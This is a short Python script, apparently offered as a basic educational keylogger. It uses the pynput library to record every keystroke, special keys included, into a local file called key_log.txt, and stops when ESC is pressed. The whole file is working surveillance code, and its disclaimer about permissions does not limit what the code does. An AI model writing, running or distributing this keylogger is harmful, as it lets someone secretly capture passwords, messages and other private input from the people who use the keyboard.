# keylogger.py
# Basic Keylogger (for educational purposes only)
# Use this script ONLY with proper permissions and ethical considerations.

from pynput import keyboard

# File to store logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop keylogger if ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[INFO] Keylogger stopped.")
        return False

print("[INFO] Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
